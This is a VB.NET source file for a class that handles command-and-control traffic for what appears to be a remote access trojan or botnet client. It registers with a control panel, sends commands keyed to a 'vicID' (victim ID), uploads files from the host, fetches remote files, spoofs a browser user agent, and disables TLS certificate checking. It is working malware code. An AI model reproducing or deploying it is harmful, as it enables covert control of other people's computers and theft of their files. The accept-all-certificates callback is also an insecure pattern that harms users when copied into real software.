Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Web

Namespace HTTPSocket
    Public Class HTTP
        Public Host As String
        Public Data As String
        Public Y As String = "|BN|"
        Public ID As String
        Public DebugMode As Boolean = False
        Public Function _GET(ByVal request As String)
            Try
                Dim responseData As String = ""
                Dim URL As New Uri(Host & "/" & request)
                Dim s As Net.HttpWebRequest
                Dim enc As UTF8Encoding
                ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
                s = HttpWebRequest.Create(URL)
                enc = New System.Text.UTF8Encoding()
                s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
                s.Method = "GET"
                Dim _Response As Net.HttpWebResponse = s.GetResponse()
                Dim responseStream As IO.StreamReader = New IO.StreamReader(_Response.GetResponseStream())
                responseData = responseStream.ReadToEnd()
                _Response.Close()
                Return enc.GetString(enc.GetBytes(responseData))
            Catch ex As WebException
                Debug(ex.Message)
                Return False
            End Try
        End Function
        Public Function _POST(ByVal filename As String, ByVal requstData As String)
            Try
                Dim s As HttpWebRequest
                Dim enc As UTF8Encoding
                Dim URL As New Uri(Host & "/" & filename)
                Dim postdatabytes As Byte()
                ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
                s = HttpWebRequest.Create(URL)
                enc = New System.Text.UTF8Encoding()
                postdatabytes = enc.GetBytes(requstData)
                s.Method = "POST"
                s.ContentType = "application/x-www-form-urlencoded"
                s.ContentLength = postdatabytes.Length
                s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
                Using Stream = s.GetRequestStream()
                    Stream.Write(postdatabytes, 0, postdatabytes.Length)
                End Using
                Dim result = s.GetResponse()
                Return True
            Catch ex As WebException
                Debug(ex.Message)
                Return False
            End Try
        End Function
        Public Function Connect()
            Try
                _POST("connection.php", "data=" & ENB(ID & Y & Data))
                Return True
            Catch ex As WebException
                Debug(ex.Message)
                Return False
            End Try
        End Function
        Public Function Send(ByVal Command As String)
            Try
                _GET("receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
                Return True
            Catch ex As WebException
                Debug(ex.Message)
                Return ex.Message
            End Try
        End Function
        Public Function Upload(ByVal Filepath As String)
            Try
                Dim Socket As New WebClient
                ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
                Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
                Return True
            Catch ex As WebException
                Debug(ex.Message)
                Return False
            End Try
        End Function
        Public Function Log(ByVal Type As String, ByVal Message As String)
            Send("NewLog" & Y & Type & Y & Message)
            Return True
        End Function
        Private Function IsAccessable(ByVal PanelURL As String)
            Dim url As New System.Uri(PanelURL)
            Dim req As System.Net.WebRequest
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
            req = System.Net.WebRequest.Create(url)
            Dim resp As System.Net.WebResponse
            Try
                resp = req.GetResponse()
                resp.Close()
                req = Nothing
                Return True
            Catch ex As WebException
                req = Nothing
                Debug(ex.Message)
                Return False
            End Try
        End Function
        Public Function IsPanel(ByVal PanelURL As String) As Boolean
            Try
                Dim s As Boolean
                If (IsAccessable(PanelURL) = True) Then
                    Dim a As String = DownloadString(PanelURL & "/check_panel.php")
                    If (a = Boolean.TrueString Or a = Boolean.FalseString) Then
                        s = Boolean.Parse(a)
                    Else
                        s = False
                    End If
                End If
                Return s
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Function ENB(ByRef s As String) As String
            Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
            Dim output = Convert.ToBase64String(byt)
            output = output.Split("=")(0)
            output = output.Replace("+", "-")
            output = output.Replace("/", "_")
            ENB = output
        End Function
        Public Function DEB(ByRef s As String) As String
            Dim output = s
            output = output.Replace("-", "+")
            output = output.Replace("_", "/")

            Select Case output.Length Mod 4
                Case 0
                Case 2
                    output += "=="
                Case 3
                    output += "="
            End Select

            Dim converted = Convert.FromBase64String(output)
            DEB = System.Text.Encoding.UTF8.GetString(converted)
        End Function
        Public Function DownloadFile(ByVal URL As String, ByVal Filename As String)
            Dim s As New WebClient
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
            s.DownloadFile(URL, Filename)
            Return True
        End Function
        Public Function DownloadData(ByVal URL As String) As Byte()
            Dim s As New WebClient
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
            Return s.DownloadData(URL)
        End Function
        Public Function DownloadString(ByVal URL As String)
            Dim s As New WebClient
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
            Return s.DownloadString(URL)
        End Function
        Private Function Debug(Optional ByVal data As String = "init")
            Try
                If DebugMode = True Then
                    If (data = "init") Then
                        If Not File.Exists("logs.txt") Then
                            File.Create("logs.txt")
                        End If
                    Else
                        If File.Exists("logs.txt") Then
                            File.AppendAllText("logs.txt", "[" & DateTime.Now & "]" & ": " & data & Environment.NewLine)
                        End If
                    End If
                    Return True
                Else
                    Return False
                End If
            Catch ex As Exception
                Return False
            End Try
        End Function
        Private Function AcceptAllCertifications(ByVal sender As Object, ByVal certification As System.Security.Cryptography.X509Certificates.X509Certificate, ByVal chain As System.Security.Cryptography.X509Certificates.X509Chain, ByVal sslPolicyErrors As System.Net.Security.SslPolicyErrors) As Boolean
            Return True
        End Function
    End Class
End Namespace
